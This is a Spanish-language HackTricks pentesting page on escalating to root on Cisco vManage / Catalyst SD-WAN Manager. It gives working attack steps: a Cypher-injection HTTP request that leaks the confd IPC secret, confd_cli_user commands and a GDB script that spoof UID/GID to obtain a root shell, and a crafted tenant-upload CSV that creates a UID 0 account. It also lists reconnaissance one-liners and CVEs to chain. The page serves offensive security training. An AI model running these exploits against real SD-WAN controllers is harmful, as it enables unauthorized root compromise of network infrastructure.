# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Una vez que tengas ejecución de código en Cisco vManage / *Catalyst SD-WAN Manager* como `vmanage`, `netadmin` o `vmanage-admin`, las superficies locales de privesc más interesantes suelen ser la pila CLI de `confd`, el helper `cmdptywrapper`, las APIs REST de localhost y los manejadores de importación/carga propiedad de root.

Si todavía necesitas el **initial foothold** en un controller, revisa primero la página dedicada al control plane:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Quick local triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Si `/etc/confd/confd_ipc_secret` es legible desde tu foothold, Path 1 y Path 2 se vuelven inmediatamente prácticos. Si llegaste a través de un remote info leak o un webshell, también comprueba si ya puedes acceder al material SSH de `vmanage-admin` o a los upload handlers de multitenancy: la investigación de 2026 mostró que ambos eran pasos intermedios realistas.

## Path 1

(Ejemplo de [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

Después de investigar un poco en cierta [documentation](http://66.218.245.39/doc/html/rn03re18.html) relacionada con `confd` y los distintos binaries (accesible con una cuenta en el sitio web de Cisco), encontramos que, para autenticarse en el socket IPC, usa un secret ubicado en `/etc/confd/confd_ipc_secret`:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
¿Recuerdas nuestra instancia de Neo4j? Está ejecutándose con los privilegios del usuario `vmanage`, lo que nos permite recuperar el archivo usando la vulnerabilidad anterior:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
El programa `confd_cli` no admite argumentos de línea de comandos, pero llama a `/usr/bin/confd_cli_user` con argumentos. Así que podríamos llamar directamente a `/usr/bin/confd_cli_user` con nuestro propio conjunto de argumentos. Sin embargo, no es legible con nuestros privilegios actuales, así que tenemos que recuperarlo del rootfs y copiarlo usando scp, leer la ayuda y usarlo para obtener la shell:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Path 2

(Ejemplo de [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

El blog¹ del equipo synacktiv describía una forma elegante de obtener una root shell, pero el inconveniente es que requiere conseguir una copia de `/usr/bin/confd_cli_user`, que solo es legible por root. Encontré otra forma de escalar a root sin tanta complicación.

Cuando desensamblé el binario `/usr/bin/confd_cli`, observé lo siguiente:

<details>
<summary>Objdump mostrando la recolección de UID/GID</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Cuando ejecuté “ps aux”, observé lo siguiente (_note -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Hipoteticé que el programa “confd_cli” pasa el user ID y group ID que recopiló del usuario autenticado a la aplicación “cmdptywrapper”.

Mi primer intento fue ejecutar “cmdptywrapper” directamente y suministrarle `-g 0 -u 0`, pero falló. Parece que se creó un file descriptor (-i 1015) en algún punto del proceso y no puedo falsificarlo.

Como se menciona en el blog de synacktiv (último ejemplo), el programa “confd_cli” no soporta argumentos de línea de comandos, pero puedo influir en él con un debugger y, afortunadamente, GDB está incluido en el sistema.

Creé un script de GDB en el que forcé a las APIs `getuid` y `getgid` a devolver 0. Como ya tengo privilegio “vmanage” mediante el deserialization RCE, tengo permiso para leer directamente `/etc/confd/confd_ipc_secret`.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
<details>
<summary>Salida de consola</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Path 3 (2025 CLI input validation bug - CVE-2025-20122)

Cisco luego documentó una ruta local más limpia para root en su propio advisory para [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt): un **atacante autenticado con solo privilegios de solo lectura** podía enviar una request manipulada al manager CLI y saltar a root debido a una validación de input insuficiente.

Desde una perspectiva ofensiva, esta es la conclusión importante:

1. Una vez que tengas *cualquier* foothold de bajo privilegio en la máquina, deberías probar el local CLI service antes de ir por el flujo más pesado de Path 1 / Path 2.
2. Reutiliza los artifacts de Path 2 para encontrar el trust boundary: `confd_cli` → `cmdptywrapper` → `vshell`.
3. Trata cada campo reenviado al backend del CLI como sospechoso: UID/GID, username, terminal metadata, imported files, o cualquier valor consumido más tarde por un helper propiedad de root.
4. Si un usuario de bajo privilegio puede llegar al local CLI socket e influir en esos campos, root puede estar a solo una request manipulada de distancia.

Un flujo de trabajo práctico después de aterrizar en el appliance es:
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
Esto convierte el bug de 2025 en un buen patrón de hunting para versiones similares: busca **local CLI shims que collect identity en userland y forward it to a more privileged wrapper**.

No confundas **CVE-2025-20122** con la posterior **CVE-2026-20122**: el problema de 2025 es un bug *local* de CLI-to-root, mientras que el de 2026 es un *remote* API arbitrary file overwrite que es principalmente útil para plantar un foothold y luego revisar Path 1 / Path 2 / Path 4.

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

El advisory de Cisco de febrero de 2026 también introdujo otra clase útil de privesc: [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) permitía a un **authenticated, local attacker with low privileges** obtener root debido a un insuficiente user-authentication mechanism en la REST API.

Esto importa porque la privesc en vManage ya no se limita a abuso de `confd`/TTY. Después de obtener un shell de low-priv, busca también:

- localhost-only API endpoints que confían demasiado en el caller
- tokens, cookies o service credentials legibles desde la cuenta actual
- root-only actions expuestas a través de handlers `dataservice`/REST que aún pueden ser activadas localmente

En la práctica, una vez que tienes un shell como `vmanage` u otro service user, el abuso local de la API suele ser más silencioso y más fácil de automatizar que el abuso interactivo de la CLI:
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
Si el contexto de la sesión local es suficiente para alcanzar funcionalidad REST privilegiada, preferir la ruta de la API: es más fácil de reproducir, automatizar y encadenar con sesiones web robadas o tokens de API.

## Path 5 (2026 crafted file processed by root - CVE-2026-20245)

Otro patrón reciente es [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx): un atacante local con privilegios `netadmin` podía subir un **crafted file** que luego la CLI manejaba de forma insegura, lo que llevaba a command injection como `root`.

Desde el punto de vista de HackTricks, la técnica valiosa es más amplia que el CVE específico:

1. Enumera cada flujo de trabajo de CLI o web que acepte un archivo: imports, diagnostic bundles, templates, validators, backups, tenant data, etc.
2. Rastrea dónde termina el archivo subido y qué script o binario propiedad de root lo consume.
3. Prueba si el nombre del archivo, el contenido del archivo o los metadatos parseados se pasan alguna vez a comandos de shell, wrapper scripts o ayudantes estilo `system()`.
4. Si ya puedes llegar a `netadmin` (credenciales válidas, sesión robada o una cadena de auth-bypass), los bugs de procesamiento de archivos suelen ser la vía más rápida hacia root.

Google Cloud / Mandiant más tarde mostró una instancia muy concreta de esta clase de bug explotada a través de la ruta de importación de multitenancy:
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
En el ataque observado, el CSV elaborado terminó modificando `/etc/passwd` y `/etc/shadow` para crear una cuenta temporal UID 0 (`troot`). Eso hace que los importadores estilo `tenant-upload` / `tenant-list` sean especialmente interesantes: no son solo funciones de ingesta de datos, sino posibles front-ends de parser propiedad de root.

Un patrón rápido de búsqueda en shell es:
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Esta clase de bug encadena especialmente bien con footholds remotos que conceden `netadmin` pero no `root`.

## Otras vulns recientes de vManage/Catalyst SD-WAN Manager para encadenar

- **Unauthenticated info leak (CVE-2026-20133)** – Especialmente de alto valor porque la investigación pública mostró que podía exponer `confd_ipc_secret` o la clave privada de `vmanage-admin`, convirtiendo un bug de lectura en Path 1 o en un pivote NETCONF.
- **Authenticated API arbitrary file overwrite (CVE-2026-20122)** – Distinta del bug CLI de 2025 de arriba; VulnCheck la usó para subir un webshell, lo que hace que los caminos de privesc locales de esta página sean inmediatamente relevantes.
- **Authenticated UI XSS (CVE-2024-20475)** – Roba una sesión de admin en la web UI, luego pivota a acciones de API/CLI que eventualmente llegan a `vshell` o a uno de los caminos de privesc locales de arriba.
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – Precursora muy fuerte para Path 5 porque `netadmin` es exactamente el nivel requerido por la privesc de archivo forjado de 2026.
- **Authenticated arbitrary file write (CVE-2026-20262)** – Valor ofensivo similar a CVE-2026-20122 pero a través de una ruta posterior de subida en la web UI: escribe en una ubicación que luego será parseada por root o por la capa web del plano de gestión.
- **Downgrade to resurrect old CLI privesc (CVE-2022-20775)** – Las intrusiones de 2026 mostraron que los atacantes pueden volver a una versión vulnerable más antigua de SD-WAN, abusar del viejo bug root de CLI y luego restaurar la versión original.
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – Mejor documentado en la página dedicada al control-plane de SD-WAN; puede añadir una SSH key para `vmanage-admin`, dándote el foothold local necesario para revisar esta página.



## References

- [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [VulnCheck: Herding Cats - Recent Cisco SD-WAN Manager Vulnerabilities](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [Google Cloud / Mandiant: Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
{{#include ../../banners/hacktricks-training.md}}
